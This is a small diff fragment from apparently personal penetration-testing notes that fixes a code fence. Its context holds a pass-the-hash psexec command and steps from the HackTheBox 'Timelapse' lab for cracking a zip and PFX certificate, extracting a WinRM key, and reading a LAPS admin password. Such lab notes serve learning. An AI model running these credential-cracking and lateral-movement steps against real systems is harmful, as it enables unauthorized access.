@@ -3075,7 +3075,7 @@ impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e39
 - I have situation has winrm_backup.zip, and some documents realated to ms-Mcs-AdmPwd LAPS password read
 - Through zip2john and pfx2john got the password through openssl get the winrm cert.pem and key.pem using that loggedin then LAPS to got admin password
 - Reference Timelapse from HackTheBox
-````powershell
+```powershell
 zip2john winrm_backup.zip > zip.hash # John cracked the password
 pfx2john legacyy_dev_auth.pfx > pfx.hash # John cracked the password
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
